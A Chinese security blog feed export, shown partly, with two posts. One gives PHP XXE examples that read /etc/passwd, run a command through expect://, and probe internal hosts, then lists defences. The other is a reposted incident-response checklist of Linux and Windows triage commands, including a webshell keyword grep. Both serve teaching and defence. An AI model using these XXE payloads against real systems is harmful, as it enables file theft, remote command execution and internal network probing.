<p>XXE危害：读取任意文件<br>由于采用的centos的系统，一些效果可能没有出来，但是思路是没有错的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$xml = &lt;&lt;&lt; EOF</div><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  </div><div class="line">&lt;!DOCTYPE ANY [  </div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&gt;]&gt;    </div><div class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</div><div class="line">EOF;</div><div class="line">$data = simplexml_load_string($xml);</div><div class="line">print_r($data);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>XXE危害：执行系统命令</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$xml=&lt;&lt;&lt;EOF</div><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;!DOCTYPE ANY [</div><div class="line">        &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</div><div class="line">EOF;</div><div class="line">$data = simplexml_load_string($xml);</div><div class="line">print_r($data);</div><div class="line">$a =3;</div><div class="line">echo $a;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-6-30/80284871.jpg" alt=""></p>
<blockquote>
<p>探测内网端口</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$xml=&lt;&lt;&lt;EOF</div><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;!DOCTYPE ANY [</div><div class="line">        &lt;!ENTITY xxe SYSTEM &quot;http://192.168.0.121:80/web1/&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</div><div class="line">EOF;</div><div class="line">$data = simplexml_load_string($xml);</div><div class="line">print_r($data);</div><div class="line">$a =3;</div><div class="line">echo $a;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<blockquote>
<p>XXE危害：攻击内网网站</p>
</blockquote>
<h3 id="0x04-XXE防御"><a href="#0x04-XXE防御" class="headerlink" title="0x04 XXE防御"></a>0x04 XXE防御</h3><ul>
<li><p>使用开发语言提供的禁用外部实体的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">PHP：</div><div class="line">libxml_disable_entity_loader(true);</div><div class="line">JAVA:</div><div class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</div><div class="line">dbf.setExpandEntityReferences(false);</div><div class="line">Python：</div><div class="line">from lxml import etree</div><div class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</div></pre></td></tr></table></figure>
</li>
<li><p>过滤用户提交的XML数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</div></pre></td></tr></table></figure>
</li>
</ul>
<p>参考链接：<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/69</a><br>        <a href="http://thief.one/2017/06/20/1/" target="_blank" rel="external">http://thief.one/2017/06/20/1/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-XXE&quot;&gt;&lt;a href=&quot;#0x01-XXE&quot; class=&quot;headerlink&quot; title=&quot;0x01 XXE&quot;&gt;&lt;/a&gt;0x01 XXE&lt;/h3&gt;&lt;p&gt;　　XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击，漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。&lt;/p&gt;
&lt;h3 id=&quot;0x02-XML&quot;&gt;&lt;a href=&quot;#0x02-XML&quot; class=&quot;headerlink&quot; title=&quot;0x02 XML&quot;&gt;&lt;/a&gt;0x02 XML&lt;/h3&gt;&lt;p&gt;　　XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。&lt;br&gt;
    
    </summary>
    
      <category term="漏洞" scheme="https://zjw.dropsec.xyz/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="https://zjw.dropsec.xyz/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="XXE" scheme="https://zjw.dropsec.xyz/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>[转]黑客入侵应急分析手工排查</title>
    <link href="https://zjw.dropsec.xyz/%E6%B8%97%E9%80%8F/2017/06/16/%E8%BD%AC-%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%E5%BA%94%E6%80%A5%E5%88%86%E6%9E%90%E6%89%8B%E5%B7%A5%E6%8E%92%E6%9F%A5.html"/>
    <id>https://zjw.dropsec.xyz/渗透/2017/06/16/转-黑客入侵应急分析手工排查.html</id>
    <published>2017-06-16T12:55:01.000Z</published>
    <updated>2017-06-18T02:19:38.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-事件分类"><a href="#0x00-事件分类" class="headerlink" title="0x00 事件分类"></a>0x00 事件分类</h3><p>常见的安全事件：<br>　　Web入侵：挂马、篡改、Webshell<br>　　系统入侵：系统异常、RDP爆破、SSH爆破、主机漏洞<br>　　病毒木马：远控、后门、勒索软件<br>　　信息泄漏：拖裤、数据库登录（弱口令）<br>　　网络流量：频繁发包、批量请求、DDOS攻击<br><a id="more"></a></p>
<h3 id="0x01-排查思路"><a href="#0x01-排查思路" class="headerlink" title="0x01 排查思路"></a>0x01 排查思路</h3><p><strong>一个常规的入侵事件后的系统排查思路：</strong><br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/44445401.jpg" alt=""></p>
<ul>
<li>文件分析<br>​a) 文件日期、新增文件、可疑/异常文件、最近使用文件、浏览器下载文件<br>​b) Webshell 排查与分析<br>​c) 核心应用关联目录文件分析</li>
<li>进程分析<br>a) 当前活动进程 &amp; 远程连接<br>​b) 启动进程&amp;计划任务<br>​c) 进程工具分析<br>　　Windows:Pchunter<br>　　Linux: Chkrootkit&amp;Rkhunter</li>
<li>系统信息<br>a) 环境变量<br>​b) 帐号信息<br>​c) History<br>​d) 系统配置文件</li>
<li>日志分析<br>a) 操作系统日志<br>　　Windows: 事件查看器（eventvwr）<br>　　Linux: /var/log/<br>​b) 应用日志分析<br>　　Access.log<br>　　Error.log</li>
</ul>
<h3 id="0x02-分析排查"><a href="#0x02-分析排查" class="headerlink" title="0x02 分析排查"></a>0x02 分析排查</h3><h4 id="0x01-Linux系列分析排查"><a href="#0x01-Linux系列分析排查" class="headerlink" title="0x01 Linux系列分析排查"></a>0x01 Linux系列分析排查</h4><p>1、文件分析</p>
<ul>
<li>敏感目录的文件分析（类/tmp目录，命令目录/usr/bin /usr/sbin）<br>例如:<br>　　​查看tmp目录下的文件： ls –alt /tmp/<br>　　​查看开机启动项内容：ls -alt /etc/init.d/<br>　　​查看指定目录下文件时间的排序：ls  -alt  | head -n 10<br>　　​针对可疑文件可以使用stat进行创建修改时间、访问时间的详细查看，若修改时间距离事件日期接近，有线性关联，说明可能被篡改或者其他。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/4337956.jpg" alt=""></li>
<li><p>新增文件分析<br>​例如要查找24小时内被修改的JSP文件： find ./ -mtime 0 -name “*.jsp”<br>（最后一次修改发生在距离当前时间n24小时至(n+1)24 小时）<br>​查找72小时内新增的文件find / -ctime -2<br>​PS：-ctime 内容未改变权限改变时候也可以查出<br>根据确定时间去反推变更的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">​ls -al /tmp | grep &quot;Feb 27&quot;</div></pre></td></tr></table></figure>
</li>
<li><p>特殊权限的文件<br>　　查找777的权限的文件   find  /  *.jsp  -perm 4777  </p>
</li>
<li>隐藏的文件（以 “.”开头的具有隐藏属性的文件）</li>
<li>在文件分析过程中，手工排查频率较高的命令是 find grep ls 核心目的是为了关联推理出可疑文件。</li>
</ul>
<p>2、进程命令</p>
<ul>
<li>使用netstat 网络连接命令，分析可疑端口、可疑IP、可疑PID及程序进程<br>netstat –antlp | more<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/75256723.jpg" alt=""></li>
<li>使用ps命令，分析进程<br>ps aux | grep pid | grep –v grep<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/97053272.jpg" alt=""><br>将netstat与ps 结合，可参考vinc牛的案例：<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/11388717.jpg" alt=""><br>（可以使用lsof -i:1677 查看指定端口对应的程序）</li>
<li>使用ls 以及 stat 查看系统命令是否被替换<br>​两种思路：第一种查看命令目录最近的时间排序，第二种根据确定时间去匹配。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">​ls -alt /usr/bin   | head -10</div><div class="line">​ls -al /bin /usr/bin /usr/sbin/ /sbin/ | grep &quot;Jan 15&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/40654881.jpg" alt=""><br><strong>PS：如果日期数字&lt;10，中间需要两个空格。比如1月1日，grep “Jan  1”</strong></p>
<ul>
<li>隐藏进程查看<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ps -ef | awk &apos;&#123;print&#125;&apos; | sort -n | uniq &gt;1</div><div class="line">ls /proc | sort -n |uniq &gt;2</div><div class="line">diff 1 2</div></pre></td></tr></table></figure>
</li>
</ul>
<p>3、系统信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">history (cat /root/.bash_history)</div><div class="line">/etc/passwd</div><div class="line">crontab  /etc/cron*</div><div class="line">rc.local  /etc/init.d chkconfig</div><div class="line">last</div><div class="line">$PATH</div><div class="line">strings</div></pre></td></tr></table></figure></p>
<ul>
<li>查看分析history (cat /root/.bash_history)，曾经的命令操作痕迹，以便进一步排查溯源。运气好有可能通过记录关联到如下信息：<br>a) wget 远程某主机（域名&amp;IP）的远控文件；<br>b) 尝试连接内网某主机（ssh scp），便于分析攻击者意图;<br>c) 打包某敏感数据或代码，tar zip 类命令<br>d) 对系统进行配置，包括命令修改、远控木马类，可找到攻击者关联信息</li>
<li>查看分析用户相关分析<br>​a) useradd userdel 的命令时间变化（stat），以及是否包含可疑信息<br>b) cat /etc/passwd 分析可疑帐号，可登录帐号<br>　　查看UID为0的帐号：awk -F: ‘{if($3==0)print $1}’ /etc/passwd<br>　　查看能够登录的帐号：cat /etc/passwd  | grep -E “/bin/bash$”<br><strong>PS：UID为0的帐号也不一定都是可疑帐号，Freebsd默认存在toor帐号，且uid为0.（toor 在BSD官网解释为root替代帐号，属于可信帐号）</strong><br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/30173410.jpg" alt=""></li>
<li>查看分析任务计划<br>a) 通过crontabl –l 查看当前的任务计划有哪些，是否有后门木马程序启动相关信息；<br>b) 查看etc目录任务计划相关文件，ls /etc/cron*</li>
<li>查看linux 开机启动程序<br>a) 查看rc.local文件（/etc/init.d/rc.local     /etc/rc.local）<br>b) ls –alt /etc/init.d/<br>c) chkconfig</li>
<li>查看系统用户登录信息<br>a) 使用lastlog命令，系统中所有用户最近一次登录信息。<br>b) 使用lastb命令，用于显示用户错误的登录列表<br>c) 使用last命令，用于显示用户最近登录信息（数据源为/var/log/wtmp，var/log/btmp）<br>　　utmp文件中保存的是当前正在本系统中的用户的信息。<br>　　wtmp文件中保存的是登录过本系统的用户的信息。<br>　　/var/log/wtmp 文件结构和/var/run/utmp 文件结构一样，都是引用/usr/include/bits/utmp.h 中的struct utmp<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/87352127.jpg" alt=""></li>
<li>系统路径分析<br>a) echo $PATH 分析有无敏感可疑信息</li>
<li>指定信息检索<br>a) strings命令在对象文件或二进制文件中查找可打印的字符串<br>b) 分析sshd 文件，是否包括IP信息strings /usr/bin/.sshd | egrep ‘[1-9]{1,3}.[1-9]{1,3}.’<br>　<strong>PS：此正则不严谨，但匹配IP已够用</strong><br>c) 根据关键字匹配命令内是否包含信息（如IP地址、时间信息、远控信息、木马特征、代号名称）</li>
<li>查看ssh相关目录有无可疑的公钥存在。<br>a) Redis（6379） 未授权恶意入侵，即可直接通过redis到目标主机导入公钥。<br>b) 目录： /etc/ssh    ./.ssh/</li>
</ul>
<p>4、后门排查<br>除以上文件、进程、系统 分析外，推荐工具：</p>
<blockquote>
<p>chkrootkit  rkhunter（www.chkrootkit.org   rkhunter.sourceforge.net）</p>
</blockquote>
<ul>
<li>chkrootkit<br>(迭代更新了20年)主要功能：<br>　　检测是否被植入后门、木马、rootkit<br>　　检测系统命令是否正常<br>　　检测登录日志<br>　　详细参考README<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/12792542.jpg" alt=""></li>
<li>rkhunter<br>主要功能：<br>　　系统命令（Binary）检测，包括Md5 校验<br>　　Rootkit检测<br>　　本机敏感目录、系统配置、服务及套间异常检测<br>　　三方应用版本检测<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/87352127.jpg" alt=""></li>
<li>RPM check检查<br>　　系统完整性也可以通过rpm自带的-Va来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./rpm -Va &gt; rpm.log</div></pre></td></tr></table></figure>
</li>
</ul>
<p>　　如果一切均校验正常将不会产生任何输出。如果有不一致的地方，就会显示出来。输出格式是8位长字符串,  c 用以指配置文件, 接着是文件名. 8位字符的每一个 用以表示文件与RPM数据库中一种属性的比较结果 。 . (点) 表示测试通过。.下面的字符表示对RPM软件包进行的某种测试失败：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">5 MD5 校验码</div><div class="line">S 文件尺寸</div><div class="line">L 符号连接</div><div class="line">T 文件修改日期</div><div class="line">D 设备</div><div class="line">U 用户</div><div class="line">G 用户组</div><div class="line">M 模式e (包括权限和文件类型)</div></pre></td></tr></table></figure></p>
<p>借用sobug文章案例：如下图可知ps, pstree, netstat, sshd等等系统关键进程被篡改了<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/63507042.jpg" alt=""></p>
<ul>
<li>Webshell查找<br>　　Webshell的排查可以通过<strong>文件、流量、日志</strong>三种方式进行分析，基于文件的命名特征和内容特征，相对操作性较高，在入侵后应急过程中频率也比较高。可根据webshell特征进行命令查找，简单的可使用(当然会存在漏报和误报)<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find /var/www/ -name &quot;*.php&quot; |xargs egrep &apos;assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\&#123;\&quot;\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode&apos;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>综上所述，通过chkrootkit 、rkhunter、RPM check、Webshell Check 等手段得出以下应对措施：</p>
<ul>
<li>根据进程、连接等信息关联的程序，查看木马活动信息。</li>
<li>假如系统的命令（例如netstat ls 等）被替换，为了进一步排查，需要下载一新的或者从其他未感染的主机拷贝新的命令。</li>
<li>发现可疑可执行的木马文件，不要急于删除，先打包备份一份。</li>
<li>发现可疑的文本木马文件，使用文本工具对其内容进行分析，包括回连IP地址、加密方式、关键字（以便扩大整个目录的文件特征提取）等。</li>
</ul>
<p>5、日志分析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">日志文件 /var/log/message       </div><div class="line">包括整体系统信息 /var/log/auth.log        </div><div class="line">包含系统授权信息，包括用户登录和使用的权限机制等 /var/log/userlog         </div><div class="line">记录所有等级用户信息的日志。 /var/log/cron           </div><div class="line">记录crontab命令是否被正确的执行 /var/log/xferlog(vsftpd.log)</div><div class="line">记录Linux FTP日志 /var/log/lastlog         </div><div class="line">记录登录的用户，可以使用命令lastlog查看 /var/log/secure         </div><div class="line">记录大多数应用输入的账号与密码，登录成功与否 var/log/wtmp　　      </div><div class="line">记录登录系统成功的账户信息，等同于命令last var/log/faillog　记录登录系统不成功的账号信息，一般会被黑客删除</div></pre></td></tr></table></figure></p>
<ul>
<li>日志查看分析，grep,sed,sort,awk综合运用</li>
<li>基于时间的日志管理：<br>　　/var/log/wtmp<br>　　/var/run/utmp<br>　　/var/log/lastlog(lastlog)<br>　　/var/log/btmp(lastb)</li>
<li>登录日志可以关注Accepted、Failed password 、invalid特殊关键字</li>
<li><p>登录相关命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">lastlog 记录最近几次成功登录的事件和最后一次不成功的登录    </div><div class="line">who 命令查询utmp文件并报告当前登录的每个用户。Who的缺省输出包括用户名、终端类型、登录日期及远程主机    </div><div class="line">w 命令查询utmp文件并显示当前系统中每个用户和它所运行的进程信息    </div><div class="line">users 用单独的一行打印出当前登录的用户，每个显示的用户名对应一个登录会话。如果一个用户有不止一个登录会话，那他的用户名把显示相同的次数    </div><div class="line">last 命令往回搜索wtmp来显示自从文件第一次创建以来登录过的用户    </div><div class="line">finger 命令用来查找并显示用户信息，系统管理员通过使用该命令可以知道某个时候到底有多少用户在使用这台Linux主机。</div></pre></td></tr></table></figure>
</li>
<li><p>几个语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">grep &quot;Failed password for root&quot; /var/log/auth.log | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more  #定位有多少IP在爆破主机的root帐号       </div><div class="line">grep &quot;Accepted &quot; /var/log/auth.log | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more  #登录成功的IP有哪些         </div><div class="line">tail -400f demo.log  #监控最后400行日志文件的变化 等价与 tail -n 400 -f （-f参数是实时）      less demo.log  #查看日志文件，支持上下滚屏，查找功能      </div><div class="line">uniq -c demo.log  #标记该行重复的数量，不重复值为1    </div><div class="line">grep -c &apos;ERROR&apos; demo.log  #输出文件demo.log中查找所有包行ERROR的行的数量</div></pre></td></tr></table></figure>
</li>
</ul>
<p>6、相关处置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">kill -9</div><div class="line">chattr –i</div><div class="line">rm</div><div class="line">setfacl</div><div class="line">ssh</div><div class="line">chmod</div></pre></td></tr></table></figure></p>
<h4 id="0x02-Windows系列分析排查"><a href="#0x02-Windows系列分析排查" class="headerlink" title="0x02 Windows系列分析排查"></a>0x02 Windows系列分析排查</h4><p>1、文件分析</p>
<ul>
<li>开机启动有无异常文件</li>
<li>各个盘下的temp(tmp)相关目录下查看有无异常文件</li>
<li>浏览器浏览痕迹、浏览器下载文件、浏览器cookie信息</li>
<li>查看文件时间，创建时间、修改时间、访问时间。<br>　　对应linux的ctime mtime atime，通过对文件右键属性即可看到详细的时间（也可以通过dir /tc 1.aspx 来查看创建时间），黑客通过菜刀类工具改变的是修改时间。所以如果修改时间在创建时间之前明显是可疑文件。</li>
<li>查看用户recent相关文件，通过分析最近打开分析可疑文件<br>　　a) C:\Documents and Settings\Administrator\Recent<br>　　b) C:\Documents and Settings\Default User\Recent<br>　　c) 开始,运行   %UserProfile%\Recent</li>
<li>根据文件夹内文件列表时间进行排序，查找可疑文件。当然也可以搜索指定日期范围的文件及文件件<br>Server 2008 R2系列<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/51943553.jpg" alt=""><br>Win10系列<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/55788321.jpg" alt=""></li>
<li>关键字匹配，通过确定后的入侵时间，以及webshell或js文件的关键字（比如博彩类），可以在IIS 日志中进行过滤匹配，比如经常使用:<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">知道是上传目录，在web log 中查看指定时间范围包括上传文件夹的访问请求 : findstr /s /m /I “UploadFiles” *.log</div><div class="line">某次博彩事件中的六合彩信息是six.js: findstr /s /m /I “six.js” *.aspx</div><div class="line">根据shell名关键字去搜索D盘spy相关的文件有哪些 :for /r d:\ %i in (*spy*.aspx) do @echo %i</div></pre></td></tr></table></figure>
</li>
</ul>
<p>2、进程命令</p>
<ul>
<li>netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED</li>
<li>根据netstat 定位出的pid，再通过tasklist命令进行进程定位<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/65298749.jpg" alt=""></li>
<li>通过tasklist命令查看可疑程序</li>
</ul>
<p>3、系统信息</p>
<ul>
<li>使用set命令查看变量的设置</li>
<li>Windows 的计划任务；</li>
<li>Windows 的帐号信息，如隐藏帐号等</li>
<li>配套的注册表信息检索查看，SAM文件以及远控软件类</li>
<li>查看systeminfo 信息，系统版本以及补丁信息<br>例如系统的远程命令执行漏洞MS08-067、MS09-001、MS17-010（永恒之蓝）…<br>若进行漏洞比对，建议使用Windows-Exploit-Suggester<br><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester/" target="_blank" rel="external">https://github.com/GDSSecurity/Windows-Exploit-Suggester/</a></li>
</ul>
<p>4、后门排查<br>PC Hunter是一个Windows系统信息查看软件<br><a href="http://www.xuetr.com/" target="_blank" rel="external">http://www.xuetr.com/</a><br>功能列表如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">1.进程、线程、进程模块、进程窗口、进程内存信息查看，杀进程、杀线程、卸载模块等功能</div><div class="line">2.内核驱动模块查看，支持内核驱动模块的内存拷贝</div><div class="line">3.SSDT、Shadow SSDT、FSD、KBD、TCPIP、Classpnp、Atapi、Acpi、SCSI、IDT、GDT信息查看，并能检测和恢复ssdt hook和inline hook</div><div class="line">4.CreateProcess、CreateThread、LoadImage、CmpCallback、BugCheckCallback、Shutdown、Lego等Notify Routine信息查看，并支持对这些Notify Routine的删除</div><div class="line">5.端口信息查看，目前不支持2000系统</div><div class="line">6.查看消息钩子</div><div class="line">7.内核模块的iat、eat、inline hook、patches检测和恢复</div><div class="line">8.磁盘、卷、键盘、网络层等过滤驱动检测，并支持删除</div><div class="line">9.注册表编辑</div><div class="line">10.进程iat、eat、inline hook、patches检测和恢复</div><div class="line">11.文件系统查看，支持基本的文件操作</div><div class="line">12.查看（编辑）IE插件、SPI、启动项、服务、Host文件、映像劫持、文件关联、系统防火墙规则、IME</div><div class="line">13.ObjectType Hook检测和恢复</div><div class="line">14.DPC定时器检测和删除</div><div class="line">15.MBR Rootkit检测和修复</div><div class="line">16.内核对象劫持检测</div><div class="line">17.WorkerThread枚举</div><div class="line">18.Ndis中一些回调信息枚举</div><div class="line">19.硬件调试寄存器、调试相关API检测</div><div class="line">20.枚举SFilter/Fltmgr的回调</div></pre></td></tr></table></figure></p>
<p><strong>PS：最简单的使用方法，根据颜色去辨识——可疑进程，隐藏服务、被挂钩函数：红色，然后根据程序右键功能去定位具体的程序和移除功能。根据可疑的进程名等进行互联网信息检索然后统一清除并关联注册表。</strong><br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/93373789.jpg" alt=""></p>
<p>5、后门排查</p>
<ul>
<li>可以使用hm</li>
<li>也可以使用盾类（D盾、暗组盾），如果可以把web目录导出，可以在自己虚拟机进行分析<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/27229232.jpg" alt=""></li>
</ul>
<p>6、日志分析</p>
<ul>
<li>打开事件管理器（开始—管理工具—事件查看/开始运行eventvwr）</li>
<li>主要分析安全日志，可以借助自带的筛选功能<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-16/14268899.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-17/38480079.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-17/86908955.jpg" alt=""></li>
<li>可以把日志导出为文本格式，然后使用notepad++ 打开，使用正则模式去匹配远程登录过的IP地址，在界定事件日期范围的基础，可以提高效率正则是：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">((?:(?:25[0-5]|2[0-4]\d|((1\d&#123;2&#125;)|([1-9]?\d))).)&#123;3&#125;(?:25[0-5]|2[0-4]\d|((1\d&#123;2&#125;)|([1-9]?\d))))</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-6-17/11899177.jpg" alt=""></p>
<ul>
<li>强大的日志分析工具Log Parser<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-17/68829847.jpg" alt=""><br>分析IIS日志<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LogParser.exe &quot;select top 10 time, c-ip,cs-uri-stem, sc-status, time-taken from C:\Users\sm0nk\Desktop\iis.log&quot; -o:datagrid</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-6-17/75777904.jpg" alt=""><br>　　有了这些我们就可以对windows日志进行分析了 比如我们分析域控日志的时候，想要查询账户登陆过程中，用户正确，密码错误的情况，我们需要统计出源IP，时间，用户名时，我们可以这么写（当然也可以结合一些统计函数，分组统计等等）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LogParser.exe -i:EVT &quot;SELECT TimeGenerated,EXTRACT\_TOKEN(Strings,0,&apos;|&apos;) AS USERNAME,EXTRACT\_TOKEN(Strings,2,&apos;|&apos;) AS SERVICE\_NAME,EXTRACT\_TOKEN(Strings,5,&apos;|&apos;) AS Client_IP FROM &apos;e:\logparser\xx.evtx&apos; WHERE EventID=675&quot;</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-6-17/75777904.jpg" alt=""><br>事件ID是很好的索引<br>Windows server 2008系列参考event ID：<br>4624 - 帐户已成功登录<br>4625 - 帐户登录失败<br>4648 - 试图使用明确的凭证登录（例如远程桌面）</p>
<p>7、相关处置<br>　　通过网络连接锁定的可疑进程，进行定位恶意程序后删除(taskkill)<br>　　木马查杀，可配合pchunter 进行进一步专业分析，使用工具功能进行强制停止以及删除<br>　　最后清理后，统一查看网络连接、进程、内核钩子等是否正常。</p>
<h4 id="0x03-应用类"><a href="#0x03-应用类" class="headerlink" title="0x03 应用类"></a>0x03 应用类</h4><p><strong>Apache、tomcat、Nginx、IIS</strong><br>　　无论任何web服务器其实日志需要关注的东西是一致的，即access_log和error_log。一般在确定ip地址后，通过:</p>
<ul>
<li>find . access_log |grep xargs ip攻击地址</li>
<li>find . access_log| grep xargs 木马文件名</li>
<li>cat access.log | cut -f1 -d “ “ | sort | uniq -c | sort -k 1 -r | head -10 页面访问排名前十的IP</li>
<li>cat access.log | cut -f4 -d “ “ | sort | uniq -c | sort -k 1 -r | head -10 页面访问排名前十的URL</li>
